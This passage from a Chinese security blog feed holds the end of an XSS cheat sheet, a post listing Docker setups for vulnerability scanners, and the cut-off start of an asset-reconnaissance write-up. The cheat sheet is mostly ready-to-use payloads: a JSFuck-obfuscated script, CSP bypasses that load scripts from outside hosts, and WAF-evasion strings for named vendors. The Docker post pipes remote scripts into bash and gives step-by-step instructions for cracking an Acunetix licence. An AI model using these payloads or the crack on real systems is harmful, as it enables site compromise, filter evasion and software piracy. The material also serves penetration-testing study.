<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure>

<h2 id="-70"><a href="#-70" class="headerlink" title=""></a></h2><h2 id="CSP旁路"><a href="#CSP旁路" class="headerlink" title="CSP旁路"></a>CSP旁路</h2><p>检查上的CSP<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com</a> 和后：<a href="https://websecblog.com/vulns/google-csp-evaluator/">如何使用Google的CSP评估器绕过CSP</a></p>
<h3 id="-71"><a href="#-71" class="headerlink" title=""></a></h3><h3 id="使用Google提供的JSONP绕过CSP（Trick-by-apfeifer27）"><a href="#使用Google提供的JSONP绕过CSP（Trick-by-apfeifer27）" class="headerlink" title="使用Google提供的JSONP绕过CSP（Trick by@apfeifer27）"></a>使用Google提供的JSONP绕过CSP（Trick by<a href="https://twitter.com/apfeifer27">@apfeifer27</a>）</h3><p>&#x2F;&#x2F;google.com&#x2F;complete&#x2F;search?client&#x3D;chrome&amp;jsonp&#x3D;alert(1);</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>更多 JSONP 端点 ：</p>
<ul>
<li>[&#x2F;Intruders&#x2F;jsonp_endpoint.txt](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS</a> Injection&#x2F;Intruders&#x2F;jsonp_endpoint.txt)</li>
<li><a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee&#x2F;jsonp.txt</a></li>
</ul>
<h3 id="-72"><a href="#-72" class="headerlink" title=""></a></h3><h3 id="绕过CSPlab-wallarm-com"><a href="#绕过CSPlab-wallarm-com" class="headerlink" title="绕过CSPlab.wallarm.com"></a>绕过CSP<a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">lab.wallarm.com</a></h3><p>适用于CSP，例如<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39;;</code>，<a href="http://hsts.pro/csp.php?xss=f=document.createElement(%22iframe%22);f.id=%22pwn%22;f.src=%22/robots.txt%22;f.onload=()=%3E%7Bx=document.createElement(%27script%27);x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild(x)%7D;document.body.appendChild(f);">此处为POC</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">script=document.createElement(&#x27;script&#x27;);</span><br><span class="line">script.src=&#x27;//bo0om.ru/csp.js&#x27;;</span><br><span class="line">window.frames[0].document.head.appendChild(script);</span><br></pre></td></tr></table></figure>

<h3 id="-73"><a href="#-73" class="headerlink" title=""></a></h3><h3 id="绕过CSP吻吻兽"><a href="#绕过CSP吻吻兽" class="headerlink" title="绕过CSP吻吻兽"></a>绕过CSP<a href="https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f">吻吻兽</a></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// CSP Bypass with Inline and Eval</span><br><span class="line">d=document;f=d.createElement(&quot;iframe&quot;);f.src=d.querySelector(&#x27;link[href*=&quot;.css&quot;]&#x27;).href;d.body.append(f);s=d.createElement(&quot;script&quot;);s.src=&quot;https://[YOUR_XSSHUNTER_USERNAME].xss.ht&quot;;setTimeout(function()&#123;f.contentWindow.document.head.append(s);&#125;,1000)</span><br></pre></td></tr></table></figure>

<h3 id="-74"><a href="#-74" class="headerlink" title=""></a></h3><h3 id="绕过CSP-秋田禅"><a href="#绕过CSP-秋田禅" class="headerlink" title="绕过CSP@秋田禅"></a>绕过CSP<a href="https://twitter.com/akita_zen">@秋田禅</a></h3><p>适用于CSP，例如<code>script-src self</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-75"><a href="#-75" class="headerlink" title=""></a></h3><h3 id="绕过CSP-404死亡"><a href="#绕过CSP-404死亡" class="headerlink" title="绕过CSP@404死亡"></a>绕过CSP<a href="https://twitter.com/404death/status/1191222237782659072">@404死亡</a></h3><p>适用于CSP，例如<code>script-src &#39;self&#39; data:</code> 正如官方警告的那样<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">mozilla文档</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;data:,alert(1)&quot;&gt;/&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="-76"><a href="#-76" class="headerlink" title=""></a></h2><h2 id="通用WAF旁路"><a href="#通用WAF旁路" class="headerlink" title="通用WAF旁路"></a>通用WAF旁路</h2><h3 id="-77"><a href="#-77" class="headerlink" title=""></a></h3><h3 id="Cloudflare-XSS绕过-博丹·科尔任斯基"><a href="#Cloudflare-XSS绕过-博丹·科尔任斯基" class="headerlink" title="Cloudflare XSS绕过@博丹·科尔任斯基"></a>Cloudflare XSS绕过<a href="https://twitter.com/bohdansec">@博丹·科尔任斯基</a></h3><h4 id="-78"><a href="#-78" class="headerlink" title=""></a></h4><h4 id="2021年1月25日"><a href="#2021年1月25日" class="headerlink" title="2021年1月25日"></a>2021年1月25日</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onrandom=random onload=confirm(1)&gt;</span><br><span class="line">&lt;video onnull=null onmouseover=confirm(1)&gt;</span><br></pre></td></tr></table></figure>

<h4 id="-79"><a href="#-79" class="headerlink" title=""></a></h4><h4 id="2020-年-4-月-21-日"><a href="#2020-年-4-月-21-日" class="headerlink" title="2020 年 4 月 21 日"></a>2020 年 4 月 21 日</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/OnLoad=&quot;`$&#123;prompt``&#125;`&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="-80"><a href="#-80" class="headerlink" title=""></a></h4><h4 id="供应-2019-年-08-月-归档"><a href="#供应-2019-年-08-月-归档" class="headerlink" title="供应 2019 年 08 月 归档"></a>供应 2019 年 08 月 归档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=%26nbsp;alert`bohdan`+</span><br></pre></td></tr></table></figure>

<h4 id="-81"><a href="#-81" class="headerlink" title=""></a></h4><h4 id="供应-2019-年-06-月-归档"><a href="#供应-2019-年-06-月-归档" class="headerlink" title="供应 2019 年 06 月 归档"></a>供应 2019 年 06 月 归档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;&quot;&gt;&lt;img/src/onerror=.1|alert``&gt;</span><br></pre></td></tr></table></figure>

<h4 id="-82"><a href="#-82" class="headerlink" title=""></a></h4><h4 id="供应-2019-年-06-月-归档-1"><a href="#供应-2019-年-06-月-归档-1" class="headerlink" title="供应 2019 年 06 月 归档"></a>供应 2019 年 06 月 归档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=prompt%26%230000000040document.domain)&gt;</span><br><span class="line">&lt;svg onload=prompt%26%23x000000028;document.domain)&gt;</span><br><span class="line">xss&#x27;&quot;&gt;&lt;iframe srcdoc=&#x27;%26lt;script&gt;;prompt`$&#123;document.domain&#125;`%26lt;/script&gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-83"><a href="#-83" class="headerlink" title=""></a></h3><h3 id="云-耀斑-XSS-旁路-2019-年-3-月-22-日-（-作者-：-RakeshMane10-）"><a href="#云-耀斑-XSS-旁路-2019-年-3-月-22-日-（-作者-：-RakeshMane10-）" class="headerlink" title="云 耀斑 XSS 旁路 - 2019 年 3 月 22 日 （ 作者 ：@RakeshMane10 ）"></a>云 耀斑 XSS 旁路 - 2019 年 3 月 22 日 （ 作者 ：@RakeshMane10 ）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f</span><br></pre></td></tr></table></figure>

<h3 id="-84"><a href="#-84" class="headerlink" title=""></a></h3><h3 id="Cloudflare-XSS旁路-2018年2月27日"><a href="#Cloudflare-XSS旁路-2018年2月27日" class="headerlink" title="Cloudflare XSS旁路-2018年2月27日"></a>Cloudflare XSS旁路-2018年2月27日</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;&amp;lpar;a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(document.domain)&amp;rpar;&quot;&gt;X&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-85"><a href="#-85" class="headerlink" title=""></a></h3><h3 id="Chrome审计员-2018年8月9日"><a href="#Chrome审计员-2018年8月9日" class="headerlink" title="Chrome审计员-2018年8月9日"></a>Chrome审计员-2018年8月9日</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)-%26apos%3B</span><br></pre></td></tr></table></figure>

<p>@brutelogic -提供的实例<a href="https://brutelogic.com.br/xss.php?c1=alert(1)-&apos;">https://brutelogic.com.br/xss.php</a></p>
<h3 id="-86"><a href="#-86" class="headerlink" title=""></a></h3><h3 id="Incapsula-WAF旁路通过-警报-供应2018年03月归档"><a href="#Incapsula-WAF旁路通过-警报-供应2018年03月归档" class="headerlink" title="Incapsula WAF旁路通过@警报- 供应2018年03月归档"></a>Incapsula WAF旁路通过<a href="https://twitter.com/Alra3ees/status/971847839931338752">@警报</a>- 供应2018年03月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anythinglr00&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;uxldz</span><br><span class="line"></span><br><span class="line">anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz</span><br></pre></td></tr></table></figure>

<h3 id="-87"><a href="#-87" class="headerlink" title=""></a></h3><h3 id="Incapsula-WAF旁路通过-c0d3G33k-供应2018年09月归档"><a href="#Incapsula-WAF旁路通过-c0d3G33k-供应2018年09月归档" class="headerlink" title="Incapsula WAF旁路通过@c0d3G33k - 供应2018年09月归档"></a>Incapsula WAF旁路通过<a href="https://twitter.com/c0d3G33k">@c0d3G33k</a> - 供应2018年09月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&#x27;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-88"><a href="#-88" class="headerlink" title=""></a></h3><h3 id="Incapsula-WAF旁路通过-戴维秒-供应2019年05月归档"><a href="#Incapsula-WAF旁路通过-戴维秒-供应2019年05月归档" class="headerlink" title="Incapsula WAF旁路通过@戴维秒 - 供应2019年05月归档"></a>Incapsula WAF旁路通过<a href="https://twitter.com/daveysec/status/1126999990658670593">@戴维秒</a> - 供应2019年05月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload\r\n=$.globalEval(&quot;al&quot;+&quot;ert()&quot;);&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-89"><a href="#-89" class="headerlink" title=""></a></h3><h3 id="Akamai-WAF绕过-泽亚诺-供应2018年06月归档"><a href="#Akamai-WAF绕过-泽亚诺-供应2018年06月归档" class="headerlink" title="Akamai WAF绕过@泽亚诺 - 供应2018年06月归档"></a>Akamai WAF绕过<a href="https://twitter.com/zseano">@泽亚诺</a> - 供应2018年06月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&quot;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-90"><a href="#-90" class="headerlink" title=""></a></h3><h3 id="Akamai-WAF绕过-s0md3v-供应2018年10月归档"><a href="#Akamai-WAF绕过-s0md3v-供应2018年10月归档" class="headerlink" title="Akamai WAF绕过@s0md3v - 供应2018年10月归档"></a>Akamai WAF绕过<a href="https://twitter.com/s0md3v/status/1056447131362324480">@s0md3v</a> - 供应2018年10月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-91"><a href="#-91" class="headerlink" title=""></a></h3><h3 id="WordFence-WAF绕过依据-野兽逻辑-供应2018年09月归档"><a href="#WordFence-WAF绕过依据-野兽逻辑-供应2018年09月归档" class="headerlink" title="WordFence WAF绕过依据@野兽逻辑 - 供应2018年09月归档"></a>WordFence WAF绕过依据<a href="https://twitter.com/brutelogic">@野兽逻辑</a> - 供应2018年09月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javas&amp;#99;ript:alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-92"><a href="#-92" class="headerlink" title=""></a></h3><h3 id="Fortiweb-WAF绕过-雷扎杜蒂-供应2019年07月归档"><a href="#Fortiweb-WAF绕过-雷扎杜蒂-供应2019年07月归档" class="headerlink" title="Fortiweb WAF绕过@雷扎杜蒂 - 供应2019年07月归档"></a>Fortiweb WAF绕过<a href="https://twitter.com/rezaduty">@雷扎杜蒂</a> - 供应2019年07月归档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\u003e\u003c\u0068\u0031 onclick=alert(&#x27;1&#x27;)\u003e</span><br></pre></td></tr></table></figure>

<h2 id="-93"><a href="#-93" class="headerlink" title=""></a></h2><h2 id="实验室"><a href="#实验室" class="headerlink" title="实验室"></a>实验室</h2><ul>
<li><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">XSS的PortSwigger实验室</a></li>
</ul>
<h2 id="-94"><a href="#-94" class="headerlink" title=""></a></h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">释放终极XSS-多语言能力</a></li>
<li>隧道掘进机</li>
<li><a href="http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html">（相对路径覆盖）RPO XSS -无限安全性</a></li>
<li><a href="http://www.thespanner.co.uk/2014/03/21/rpo/">RPO扳手</a></li>
<li><a href="https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/">RPO小工具-内部</a></li>
<li><a href="https://support.detectify.com/support/solutions/articles/48001048955-relative-path-overwrite">相对路径覆盖-检测</a></li>
<li><a href="http://d3adend.org/xss/ghettoBypass">XSS隔离区旁路-d3 adend</a></li>
<li><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html">不带HTML的XSS：使用AngularJS的客户端模板注入</a></li>
<li><a href="http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html">XSSING腹板零件-2- Rakesh马内</a></li>
<li><a href="https://www.buaq.net/go-25883.html">在Twitter上生成由CSP旁路触发的XSS。@tbmnull</a></li>
<li><a href="https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309">提醒方式（document.domain）- @tomnomnom</a></li>
<li>[D1 T1- Michele Spagnuolo和Lukas Wilschelbaum -我们打破了所有CSP](<a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1">https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1</a> - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPS.pdf)</li>
<li><a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">睡眠存储谷歌XSS唤醒$5000赏金</a> [美]帕特里克·费伦巴赫著</li>
<li><a href="https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/">导致Google中信息泄漏RPO</a> 由文件描述者</li>
<li><a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/">神一样的XSS，登录，注销，登录</a> 杰克·惠顿（Jack惠顿）在优步（Uber）上</li>
<li><a href="http://www.breaksec.com/?p=6129">三个存储在Facebook的XSS</a> [美]尼尔戈德施拉格著</li>
<li><a href="https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify">使用Braun刨削器绕过XSS审核和WAF</a> [美]弗兰斯·罗森著</li>
<li><a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/">通过PNG和Wonky内容类型在Facebook上发布XSS</a> [美]杰克·惠顿著</li>
<li><a href="https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/">已将XSS存储在 *. www.example.com中ebay.com</a> [美]杰克·惠顿著</li>
<li><a href="https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss">复杂，谷歌XSS的最佳报告</a> [美]拉姆兹著</li>
<li><a href="https://hackerone.com/reports/150179">www.example.com中的棘手Html注入和可能的XSSsms-be-vip.twitter.com</a> 作者：secgeek</li>
<li><a href="http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html">Google控制台中的命令注入</a> 文卡特S</li>
<li><a href="http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html">Facebook的移动- OAuth XSS</a> [美]保罗·伊贝罗著</li>
<li><a href="https://hackerone.com/reports/152067">通过developer.uber.comUber中的管理员帐户泄露将XSS存储在www.example.com上</a> 詹姆斯·凯特尔著（白化蜡）</li>
<li><a href="https://klikki.fi/adv/yahoo.html">Yahoo Mail存储的XSS</a> 由Klikki公司提供</li>
<li><a href="http://mksben.l0.cm/2016/07/xxn-caret.html">滥用XSS过滤器：一个^导致XSS（CVE-2016-3212）</a> [美]木怒川正人著</li>
<li><a href="https://labs.detectify.com/2015/06/06/google-xss-turkey/">Youtube XSS</a> 由fransrosen</li>
<li><a href="https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter">最好的谷歌XSS再次</a> - [美]克日什托夫·科托维奇著</li>
<li><a href="https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/">IE和边缘URL解析问题</a> - 通过检测</li>
<li><a href="http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html">Google XSS子域名点击劫持</a></li>
<li><a href="https://wesecureapp.com/blog/xss-by-tossing-cookies/">微软XSS和Twitter XSS</a></li>
<li><a href="https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/">闪存XSS兆nz</a> - 由弗兰斯</li>
<li><a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">google IE中的xss，主机头反射</a></li>
<li>[几年前谷歌xss](<a href="http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2">http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2</a> - Itzhak Zuk Avraham and Nir Goldshlager - Killing a Bug Bounty Program - Twice.pdf)</li>
<li><a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">xss在谷歌通过IE怪异的行为</a></li>
<li><a href="https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/">雅虎梦幻体育</a></li>
<li><a href="https://klikki.fi/adv/yahoo2.html">xss在雅虎邮箱再次，价值10000美元</a> 由Klikki公司提供</li>
<li><a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">在Google中休眠XSS</a> 由保安人员</li>
<li><a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">对.htpasswd进行解码以赚取有效负载的钱</a> 由保安人员</li>
<li><a href="http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form">Google帐户接管</a></li>
<li><a href="http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/">AirBnb臭虫赏金：将自我XSS转变为良好XSS #2</a> 由极客男孩</li>
<li><a href="https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html">Uber自助XSS到全球XSS</a></li>
<li><a href="https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g">我是如何找到一个5,000美元的谷歌地图XSS（通过摆弄Protobuf）</a> 作者：马林·穆利尼</li>
<li><a href="https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/">Airbnb -当绕过JSON编码时，XSS过滤器、WAF、CSP和审计器变成八个漏洞</a> [美]布雷特著</li>
<li><a href="http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html">XSSI，客户端暴力攻击</a></li>
<li><a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/">PostMessage XSS在一百万个网站上-2016年12月15日- Mathias Karlsson</a></li>
<li><a href="https://hackerone.com/reports/231053">后消息XSS绕过</a></li>
<li><a href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/">通过Cookie在Uber中使用XSS</a> 作者：日赫宾</li>
<li><a href="https://hackerone.com/reports/207042">使用www.hackerone.comMarketo Forms XSS和postMessage跳帧以及jQuery-JSONP窃取www.example.com上的联系人表单数据</a> 由弗兰斯</li>
<li><a href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/">XSS由于第三方js Uber 7 k XSS中不正确的正则表达式</a></li>
<li><a href="https://hackerone.com/reports/262230">TinyMCE 2.4.0中的XSS</a> [美]杰尔默·德·亨著</li>
<li><a href="https://hackerone.com/reports/150179">在IE11中传递未编码的URL以导致XSS</a></li>
<li><a href="http://blog.blackfan.ru/2017/09/devtwittercom-xss.html">通过停止重定向和javascript方案实现Twitter XSS</a> [美]谢尔盖·博布罗夫著</li>
<li><a href="http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html">验证DOM Uber XSS</a></li>
<li><a href="https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be">中的XSSwww.yahoo.com</a></li>
<li><a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html">使用数据集发布语言在Google中存储XSS和SSRF</a></li>
<li><a href="https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd">Snapchat上存储的XSS</a></li>
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS速查表- PortSwigger</a></li>
<li><a href="https://cure53.de/fp170.pdf">mXSS攻击：使用innerHTML突变攻击安全性良好的Web应用程序- Mario Heiderich，Jörg Schwenk，Tilman Frosch，Jonas Magazinius，Edward Z. Yang</a></li>
<li><a href="https://twitter.com/PortSwiggerRes/status/1257962800418349056">自动关闭脚本</a></li>
<li><a href="https://hackerone.com/reports/639684">使用〈绕过〈</a></li>
<li><a href="https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code">绕过基于签名的XSS过滤器：修改指令码</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>我的docker清单</title>
    <url>/posts/dc5af3d9.html</url>
    <content><![CDATA[<h2 id="nessus-Docker"><a href="#nessus-Docker" class="headerlink" title="nessus Docker"></a>nessus Docker</h2><p>项目地址：<a href="https://github.com/elliot-bia/nessus">https://github.com/elliot-bia/nessus</a></p>
<p>密码是AES加密，密钥 github&#x2F;elliot-bia ，为什么公开？因为术业有专攻。</p>
<figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">docker pull ramisec/nessus</span><br><span class="line"># 启动</span><br><span class="line">docker run -itd --name=ramisec_nessus -p <span class="number">8834</span>:<span class="number">8834</span> ramisec/nessus</span><br><span class="line"># 更新Nessus插件</span><br><span class="line">docker exec -it ramisec_nessus /bin/bash /nessus/update.sh</span><br><span class="line"></span><br><span class="line"># 访问扫描器地址和账号密码</span><br><span class="line">https:<span class="comment">//127.0.0.1:8834/#/</span></span><br><span class="line">account: admin/twitter@Elliot58616851</span><br></pre></td></tr></table></figure>



<h2 id="awvs-Docker"><a href="#awvs-Docker" class="headerlink" title="awvs Docker"></a>awvs Docker</h2><p>直接用一条命令下载运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -skm 10 https://www.fahai.org/aDisk/Awvs/check.sh) xrsec/awvs</span><br><span class="line"></span><br><span class="line">地址：https://127.0.0.1:3443/#/</span><br><span class="line">用户名：awvs@awvs.lan</span><br><span class="line">密码： Awvs@awvs.lan</span><br><span class="line">docker run -itd --name awvs -p 3443:3443 xrsec/awvs</span><br></pre></td></tr></table></figure>

<p>15.1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -sLk https://www.fahai.org/aDisk/Awvs/check.sh) xrsec/awvs:v15</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL: https://server_ip:3443/#/login</span><br><span class="line">UserName: awvs@awvs.lan</span><br><span class="line">PassWord: Awvs@awvs.lan</span><br></pre></td></tr></table></figure>

<h3 id="awvs-windows"><a href="#awvs-windows" class="headerlink" title="awvs windows"></a>awvs windows</h3><p><a href="https://www.fahai.org/index.php/archives/24/">https://www.fahai.org/index.php/archives/24/</a></p>
<p>安装包下载：<br>Acunetix_14.9 Windows原版安装包下载地址：<a href="https://www.fahai.org/aDisk/Awvs/acunetix_14.9.220713150.exe">点击此处下载</a></p>
<p>破解方法：</p>
<p>1、修改本地HOSTS文件，增加以下2条域名解析；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>

<p>2、将license_info.json、wa_data.dat等多个文件放置于以下目录；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt;&gt; C:/ProgramData/Acunetix/shared/license/</span><br></pre></td></tr></table></figure>

<p>3、将wvsc.exe文件放置于Acunetix安装根目录，与原文件进行替换即可。</p>
<p>下载地址：<br>文件链接：<a href="https://www.fahai.org/aDisk/Awvs/awvs_crack.zip">Acunetix_14.9 Windows版破解补丁</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次某集团的互联网资产梳理过程</title>
    <url>/posts/1aebb09f.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从183个子域名出发，对某企业进行互联网资产暴露面进行测绘，成果输出一份总结报告，一份可登录后台记录表，一份包含子域名、web站点及IP端口的表，一份敏感信息收集报告。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1、从183个子域名中提取出使用了真实IP的子域名、无效子域名、cdn+yunwaf子域名等三种格式的子域名</p>
<p>使用的是自己编写的工具，可用快速提取出使用了真实IP的子域名，这点很重要，因为例如OneForAll的子域名收集结果中关于cdn的判断结果十分不准确。</p>
<p><a href="https://github.com/ccc-f/FCDN">https://github.com/ccc-f/FCDN</a></p>
<p>2、批量反差子域名ip，代码demo如下：</p>
